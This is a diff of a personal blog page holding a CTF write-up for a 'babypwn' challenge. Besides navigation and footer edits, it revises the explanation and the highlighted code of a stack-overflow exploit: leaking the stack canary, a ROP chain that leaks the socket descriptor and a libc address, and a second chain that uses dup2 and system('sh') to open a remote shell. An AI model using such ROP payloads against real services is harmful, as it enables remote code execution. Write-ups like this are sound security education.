@@ -28,6 +28,8 @@
     <link rel="shortcut icon" href="https://naetw.github.io/favicon.ico" type="image/x-icon">
 
     <!-- Feeds -->
+      <link href="https://naetw.github.io/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="naetw&#39;s blog - All posts - Atom Feed"/>
+      <link href="https://naetw.github.io/feeds/write-up.atom.xml" type="application/atom+xml" rel="alternate" title="naetw&#39;s blog - Category: write-up - Atom Feed"/>
 
 
   </head>
@@ -58,17 +60,14 @@
 
           <ul class="nav navbar-nav">
 <li >
-                <a href="/tags">Tags</a>
+                <a href="/archives">Archives</a>
               </li>
 <li >
                 <a href="/categories">Categories</a>
               </li>
 <li >
-                <a href="/archives">Archives</a>
+                <a href="/tags">Tags</a>
               </li>
-<li  class="active" >
-                  <a href="https://naetw.github.io/category/write-up/">write-up <span class="sr-only">(current)</span></a>
-                </li>
           </ul>
 
 
@@ -99,12 +98,14 @@
 
   <div>
     <h2>Analyzing</h2>
+<blockquote>
 <p>32 bits ELF, Partial RELRO, with canary &amp; NX, no PIE.</p>
-<p>There is an obvious stack overflow vulnerablility, but this program uses <code>socket</code>, actually I haven't learned about socket programing so I won't talk too much about it, since all we need to do is dealing with file descriptor due to <code>fork</code>. </p>
+</blockquote>
+<p>There is an obvious stack overflow vulnerablility.</p>
 <p>Main operation is in <code>0x08048A71</code> function, and previous operation was setup of socket or sth. If you want to test this program locally:</p>
 <ul>
 <li>First run command <code>ncat -vc ./babypwn -kl 127.0.0.1 4000</code></li>
-<li>Second, after looking into the src, we need to <code>nc localhost 4000</code> first then our socket program will be started up. After that, we can test our program by port 8181(<code>nc localhost 8181</code>).</li>
+<li>Second, after looking into the src, we need to <code>nc localhost 4000</code> first, then our socket program will be activated. After that, we can test our program by connecting to port 8181 (<code>nc localhost 8181</code>).</li>
 </ul>
 <p>The behavior of this program is simple:</p>
 <div class="highlight"><pre><span></span>===============================
@@ -125,10 +126,10 @@ Select menu &gt;
 </pre></div>
 
 
-<p>Just an echo server, at first glance, I thought there was a format string vulnerablility, but it wasn't. It is just an echo server. However, we can overflow the stack when it takes the input. And we will use this vulnerablility to leak canary to do later exploit.</p>
+<p>At first glance, I thought there was a format string vulnerablility, but it wasn't. It's just an echo server. However, we can overflow the stack when it takes the input. And we will use this vulnerablility to leak canary to do later exploit.</p>
 <h2>Exploit</h2>
 <p><strong>Overflow</strong></p>
-<p>I use ida pro.</p>
+<p>Use ida pro.</p>
 <div class="highlight"><pre><span></span><span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">40</span><span class="p">];</span> <span class="c1">// [sp+24h] [bp-34h]@1</span>
 <span class="p">...</span>
 <span class="n">socket_recv</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span> <span class="c1">// socket_recv == 0x08048907</span>
@@ -142,35 +143,35 @@ Select menu &gt;
 </pre></div>
 
 
-<p><code>0x4409b50a</code> is our canary, since the first byte of canary would be '\x00', I use the newline to overwrite it so that we can leak the last 3 bytes. After we get the <code>0x4409b50a</code>, we just need to change newline back to null byte then we get the canary of this binary. So the real canary is <code>0x4409b500</code>.</p>
-<p>With canary, we can bypass the stack guard. I will use it to do the first ROP. In the first ROP, I will leak the file descriptor for the socket and the libc function address in order to get the version of libc by using <a href="http://libcdb.com">libc database</a>.</p>
+<p><code>0x4409b50a</code> is our canary. Since the first byte of canary would be '\x00', I use a newline character to overwrite it so that we can leak the last 3 bytes. After we get the <code>0x4409b50a</code>, we just need to change the newline character back to null byte then we get the canary of this binary. So the real canary is <code>0x4409b500</code>.</p>
+<p>With canary, we can bypass the stack guard. I will use it to do the first ROP. In the first ROP, I will leak the file descriptor for the socket and the libc function address in order to get the version of libc by <a href="http://libcdb.com">libc database</a>.</p>
 <p>First ROP payload:</p>
-<div class="highlight"><pre><span></span>socket_send = 0x080488B1
-pop1 = 0x08048589
-sigemptyset_got = 0x0804B048
-echo_select = 0x08048A71
-fd_address = 0x0804B1B8
-rop1 = [socket_send, pop1, sigemptyset_got, 
-        socket_send, echo_select, fd_address]
-payload = &#39;A&#39;*40 +      # padding to canary
-        p32(canary) +
-        &#39;A&#39;*12 +        # padding to return address
-        &#39;&#39;.join(map(p32, rop1))
+<div class="highlight"><pre><span></span><span class="n">socket_send</span> <span class="o">=</span> <span class="mh">0x080488B1</span>
+<span class="n">pop1</span> <span class="o">=</span> <span class="mh">0x08048589</span>
+<span class="n">sigemptyset_got</span> <span class="o">=</span> <span class="mh">0x0804B048</span>
+<span class="n">echo_select</span> <span class="o">=</span> <span class="mh">0x08048A71</span>
+<span class="n">fd_address</span> <span class="o">=</span> <span class="mh">0x0804B1B8</span>
+<span class="n">rop1</span> <span class="o">=</span> <span class="p">[</span><span class="n">socket_send</span><span class="p">,</span> <span class="n">pop1</span><span class="p">,</span> <span class="n">sigemptyset_got</span><span class="p">,</span> 
+        <span class="n">socket_send</span><span class="p">,</span> <span class="n">echo_select</span><span class="p">,</span> <span class="n">fd_address</span><span class="p">]</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">40</span> <span class="o">+</span>      <span class="c1"># padding to canary</span>
+        <span class="n">p32</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">+</span>
+        <span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">12</span> <span class="o">+</span>        <span class="c1"># padding to return address</span>
+        <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="n">p32</span><span class="p">,</span> <span class="n">rop1</span><span class="p">))</span>
 </pre></div>
 
 
 <p>After placing the ROP gadgets, we need to choose choice 3 to return, then it will return to our ROP gadgets.</p>
-<p>I use the <a href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget</a> to find the gadget <code>pop1</code> which pop once then ret. Since we need to do the second ROP(duplicate file descriptor and open the shell) after leaking information, I make the end of the first ROP return to the <code>0x08048A71</code>(function of main operation).</p>
-<p>After finding out the version of libc, we can get the libc base. In the second ROP, I will use <code>dup2</code> to copy the fd of socket to stdin and stdout then open the shell.(Use dup2 so that we can get the interactive shell)</p>
-<div class="highlight"><pre><span></span>pop2 = 0x08048B84
-sh = base + next(libc.search(&#39;sh\x00&#39;))
-rop2 = [dup2, pop2, fd, 1,
-        dup2, pop2, fd, 0,
-        system, 0xdeadbeef, sh]
-payload = &#39;A&#39;*40 +      # padding to canary
-        p32(canary) +
-        &#39;A&#39;*12 +        # padding to return address
-        &#39;&#39;.join(map(p32, rop2))
+<p>I use the <a href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget</a> to find the gadget <code>pop1</code> which pop once then ret. Since we need to do the second ROP (duplicate file descriptor and open the shell) after leaking information, I make the end of the first ROP return to the <code>0x08048A71</code> (function of main operation).</p>
+<p>After finding out the version of libc, we can get the libc base. In the second ROP, I use <code>dup2</code> to copy the fd of socket to stdin and stdout then open the shell. (Use dup2 so that we can get the interactive shell)</p>
+<div class="highlight"><pre><span></span><span class="n">pop2</span> <span class="o">=</span> <span class="mh">0x08048B84</span>
+<span class="n">sh</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+<span class="n">rop2</span> <span class="o">=</span> <span class="p">[</span><span class="n">dup2</span><span class="p">,</span> <span class="n">pop2</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span>
+        <span class="n">dup2</span><span class="p">,</span> <span class="n">pop2</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
+        <span class="n">system</span><span class="p">,</span> <span class="mh">0xdeadbeef</span><span class="p">,</span> <span class="n">sh</span><span class="p">]</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">40</span> <span class="o">+</span>      <span class="c1"># padding to canary</span>
+        <span class="n">p32</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">+</span>
+        <span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">12</span> <span class="o">+</span>        <span class="c1"># padding to return address</span>
+        <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="n">p32</span><span class="p">,</span> <span class="n">rop2</span><span class="p">))</span>
 </pre></div>
 
 
@@ -276,22 +277,22 @@ payload = &#39;A&#39;*40 +      # padding to canary
       <p>
               <a href="https://naetw.github.io/category/write-up/" rel="tag"
                   data-toggle="tooltip" class="label label-info"
-                  title="1 article in this category">write-up</a>
-            <a href="/tag/codegate/" data-toggle="tooltip"
-      class="label label-default"
-      title="1 article with this tag">CODEGATE</a>
+                  title="10 articles in this category">write-up</a>
             <a href="/tag/ctf/" data-toggle="tooltip"
       class="label label-default"
-      title="1 article with this tag">CTF</a>
+      title="10 articles with this tag">CTF</a>
             <a href="/tag/pwn/" data-toggle="tooltip"
       class="label label-default"
-      title="1 article with this tag">pwn</a>
+      title="10 articles with this tag">pwn</a>
             <a href="/tag/rop/" data-toggle="tooltip"
       class="label label-default"
-      title="1 article with this tag">ROP</a>
+      title="4 articles with this tag">ROP</a>
+            <a href="/tag/codegate/" data-toggle="tooltip"
+      class="label label-default"
+      title="2 articles with this tag">CODEGATE</a>
             <a href="/tag/stack-overflow/" data-toggle="tooltip"
       class="label label-default"
-      title="1 article with this tag">Stack Overflow</a>
+      title="2 articles with this tag">Stack Overflow</a>
       </p>
       <hr/>
 
@@ -311,8 +312,22 @@ payload = &#39;A&#39;*40 +      # padding to canary
         <div class="row">
 
             <div class="col-md-2">
+                <h5>Social</h5>
+                <ul class="list-unstyled">
+                  <li>  <a href="https://github.com/Naetw">
+      <i class="fa fa-github"></i>
+    GitHub
+  </a></li>
+                </ul>
             </div>
             <div class="col-md-2">
+                <h5>Links</h5>
+                <ul class="list-unstyled">
+                  <li>  <a href="http://getpelican.com/">
+      <img src="https://besticon-demo.herokuapp.com/icon?url=getpelican.com&size=16" width="16" height="16" class="icon" alt="getpelican.com icon"/>
+    Pelican
+  </a></li>
+                </ul>
             </div>
 
           <div class="col-md-2">
@@ -326,7 +341,7 @@ payload = &#39;A&#39;*40 +      # padding to canary
 
           <div class="col-md-2 text-muted">
             <h5>Copyright notice</h5>
-            <p>© Copyright 2017 Naetw.</p>
+            <p>© Copyright 2016-2017 Naetw.</p>
           </div>
 
           <div class="col-md-2 text-muted">
@@ -335,6 +350,11 @@ payload = &#39;A&#39;*40 +      # padding to canary
           </div>
 
           <div class="col-md-2">
+              <h5>Feeds</h5>
+              <ul class="list-unstyled">
+                  <li><small><a href="https://naetw.github.io/feeds/all.atom.xml"><i class="fa fa-rss"></i> All posts (Atom)</a></small></li>
+                  <li><small><a href="https://naetw.github.io/feeds/write-up.atom.xml"><i class="fa fa-rss"></i> Category: write-up (Atom)</a></small></li>
+              </ul>
           </div>
 
         </div>
